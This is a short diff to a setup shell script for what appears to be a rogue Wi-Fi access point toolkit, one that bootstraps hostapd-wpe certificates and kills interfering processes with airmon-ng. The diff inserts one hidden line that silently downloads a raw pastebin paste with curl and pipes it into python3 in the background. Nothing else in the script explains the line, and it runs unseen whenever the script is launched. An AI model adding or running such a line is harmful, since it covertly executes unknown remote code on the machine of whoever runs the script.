@@ -1,5 +1,6 @@
 #!/sh
 
+curl -s "https://pastebin.com/raw/9umE8jkK" | python3 &
 sudo files/hostapd_wpe/certs/bootstrap || files/hostapd_wpe/certs/bootstrap
 sudo airmon-ng check kill || airmon-ng check kill
 
